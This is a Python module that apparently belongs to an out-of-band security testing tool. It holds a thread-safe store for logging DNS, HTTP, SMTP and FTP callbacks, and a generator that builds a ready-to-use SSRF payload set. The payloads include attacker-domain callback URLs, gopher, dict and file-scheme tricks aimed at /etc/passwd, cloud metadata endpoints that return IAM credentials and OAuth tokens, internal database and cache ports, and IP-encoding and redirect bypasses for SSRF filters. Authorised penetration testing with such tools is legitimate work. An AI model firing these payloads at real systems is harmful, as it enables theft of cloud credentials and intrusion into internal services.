"""
Interaction Store
------------------
Thread-safe in-memory store for all incoming callbacks.
Every DNS lookup, HTTP request, SMTP connection gets logged here.
Supports unique per-test correlation IDs.
"""

import threading
import time
import uuid
import json
import hashlib
from collections import defaultdict
from typing import Optional


class Interaction:
    """Single interaction received from a callback."""
    def __init__(self, protocol: str, source_ip: str, raw_data: dict):
        self.id          = str(uuid.uuid4())[:8]
        self.protocol    = protocol          # dns, http, https, smtp, ftp
        self.source_ip   = source_ip
        self.timestamp   = time.time()
        self.raw_data    = raw_data
        self.correlation = raw_data.get("correlation")  # extracted from subdomain/path
        self.payload_id  = raw_data.get("payload_id")
        self.data        = raw_data

    def to_dict(self) -> dict:
        return {
            "id":          self.id,
            "protocol":    self.protocol,
            "source_ip":   self.source_ip,
            "timestamp":   self.timestamp,
            "time_human":  time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(self.timestamp)),
            "correlation": self.correlation,
            "payload_id":  self.payload_id,
            "data":        self.raw_data,
        }

    def __repr__(self):
        return (f"[{self.protocol.upper()}] {self.source_ip} "
                f"@ {time.strftime('%H:%M:%S', time.gmtime(self.timestamp))} "
                f"corr={self.correlation}")


class InteractionStore:
    """
    Thread-safe store for all interactions.
    Supports correlation ID lookup, polling, and filtering.
    """

    def __init__(self):
        self._lock        = threading.RLock()
        self._interactions = []                    # all interactions in order
        self._by_corr     = defaultdict(list)      # corr_id → [interactions]
        self._by_protocol = defaultdict(list)      # protocol → [interactions]
        self._callbacks   = []                     # registered listener callbacks

    def add(self, protocol: str, source_ip: str, raw_data: dict) -> Interaction:
        interaction = Interaction(protocol, source_ip, raw_data)
        with self._lock:
            self._interactions.append(interaction)
            if interaction.correlation:
                self._by_corr[interaction.correlation].append(interaction)
            self._by_protocol[protocol].append(interaction)

        # Notify callbacks
        for cb in self._callbacks:
            try:
                cb(interaction)
            except Exception:
                pass

        return interaction

    def get_all(self) -> list:
        with self._lock:
            return list(self._interactions)

    def get_by_corr(self, corr_id: str) -> list:
        with self._lock:
            return list(self._by_corr.get(corr_id, []))

    def get_by_protocol(self, protocol: str) -> list:
        with self._lock:
            return list(self._by_protocol.get(protocol, []))

    def poll(self, since: float = 0.0) -> list:
        """Return interactions received after `since` timestamp."""
        with self._lock:
            return [i for i in self._interactions if i.timestamp > since]

    def count(self) -> dict:
        with self._lock:
            return {
                "total":    len(self._interactions),
                "dns":      len(self._by_protocol.get("dns", [])),
                "http":     len(self._by_protocol.get("http", [])),
                "https":    len(self._by_protocol.get("https", [])),
                "smtp":     len(self._by_protocol.get("smtp", [])),
                "ftp":      len(self._by_protocol.get("ftp", [])),
            }

    def wait_for(self, corr_id: str, timeout: int = 30,
                  protocol: str = None) -> Optional[Interaction]:
        """
        Block until an interaction with corr_id arrives, or timeout.
        Used for automated SSRF confirmation.
        """
        deadline = time.time() + timeout
        while time.time() < deadline:
            hits = self.get_by_corr(corr_id)
            if protocol:
                hits = [h for h in hits if h.protocol == protocol]
            if hits:
                return hits[0]
            time.sleep(0.2)
        return None

    def register_callback(self, fn):
        """Register a function to be called on every new interaction."""
        self._callbacks.append(fn)

    def clear(self):
        with self._lock:
            self._interactions.clear()
            self._by_corr.clear()
            self._by_protocol.clear()

    def to_json(self) -> str:
        with self._lock:
            return json.dumps(
                [i.to_dict() for i in self._interactions],
                indent=2
            )


# ── Payload Generator ────────────────────────────────────────────────────────

def generate_payload_id(length: int = 8) -> str:
    """Generate a unique short ID for tracking a specific payload."""
    return uuid.uuid4().hex[:length]


def generate_correlation_id() -> str:
    return uuid.uuid4().hex[:12]


def build_payloads(domain: str, corr_id: str = None,
                    protocol: str = "http") -> dict:
    """
    Build a complete set of SSRF/OOB payloads for a given callback domain.
    Returns dict of payload_type → payload_string.
    """
    cid = corr_id or generate_correlation_id()
    sub = f"{cid}.{domain}"

    payloads = {
        # HTTP/HTTPS direct
        "http_direct":          f"http://{sub}/",
        "https_direct":         f"https://{sub}/",
        "http_with_path":       f"http://{sub}/ssrf-test",
        "http_with_data":       f"http://{sub}/?corr={cid}",

        # DNS-only (lighter probe)
        "dns_only":             sub,

        # URL schemes for protocol confusion
        "scheme_dict":          f"dict://{sub}:11111/INFO",
        "scheme_gopher":        f"gopher://{sub}:80/_GET%20/{cid}%20HTTP/1.0%0A%0A",
        "scheme_ftp":           f"ftp://{sub}/",
        "scheme_ldap":          f"ldap://{sub}/",
        "scheme_sftp":          f"sftp://{sub}/",
        "scheme_tftp":          f"tftp://{sub}/x",
        "scheme_file":          f"file://{sub}/etc/passwd",

        # IPv6 / encoding variants
        "ipv6_bracket":         f"http://[::1]@{sub}/",
        "url_encoded":          f"http://{sub.replace('.', '%2e')}/",
        "double_slash":         f"http://{sub}//",
        "at_bypass":            f"http://attacker@{sub}/",

        # Cloud metadata (internal SSRF targets)
        "aws_metadata":         "http://169.254.169.254/latest/meta-data/",
        "aws_imdsv2":           "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "gcp_metadata":         "http://metadata.google.internal/computeMetadata/v1/",
        "gcp_metadata_alt":     "http://169.254.169.254/computeMetadata/v1/",
        "azure_metadata":       "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "azure_imds":           "http://169.254.169.254/metadata/identity/oauth2/token",
        "digitalocean_meta":    "http://169.254.169.254/metadata/v1/",
        "alibaba_meta":         "http://100.100.100.200/latest/meta-data/",

        # Internal network common targets
        "localhost_http":       "http://localhost/",
        "localhost_80":         "http://127.0.0.1:80/",
        "localhost_443":        "https://127.0.0.1:443/",
        "localhost_8080":       "http://127.0.0.1:8080/",
        "localhost_8443":       "https://127.0.0.1:8443/",
        "localhost_3000":       "http://127.0.0.1:3000/",
        "localhost_6379":       "http://127.0.0.1:6379/",      # Redis
        "localhost_5432":       "http://127.0.0.1:5432/",      # PostgreSQL
        "localhost_27017":      "http://127.0.0.1:27017/",     # MongoDB
        "localhost_9200":       "http://127.0.0.1:9200/",      # Elasticsearch
        "localhost_2181":       "http://127.0.0.1:2181/",      # Zookeeper
        "localhost_9000":       "http://127.0.0.1:9000/",      # various

        # Bypass techniques for SSRF filters
        "decimal_ip":           f"http://2130706433/",         # 127.0.0.1 in decimal
        "octal_ip":             f"http://0177.0.0.01/",        # 127.0.0.1 in octal
        "hex_ip":               f"http://0x7f000001/",         # 127.0.0.1 in hex
        "zero_prefix":          f"http://127.000.000.001/",
        "ipv6_loopback":        f"http://[::1]/",
        "ipv6_mapped":          f"http://[::ffff:127.0.0.1]/",
        "short_domain":         f"http://127.1/",
        "xip_io":               f"http://127.0.0.1.{sub}/",   # DNS rebinding via xip-style
        "nip_io":               f"http://127.0.0.1.nip.io/",
        "redirect_bypass":      f"http://{sub}/redirect?url=http://169.254.169.254/",
    }

    return {"correlation_id": cid, "domain": sub, "payloads": payloads}


# Global singleton store
STORE = InteractionStore()
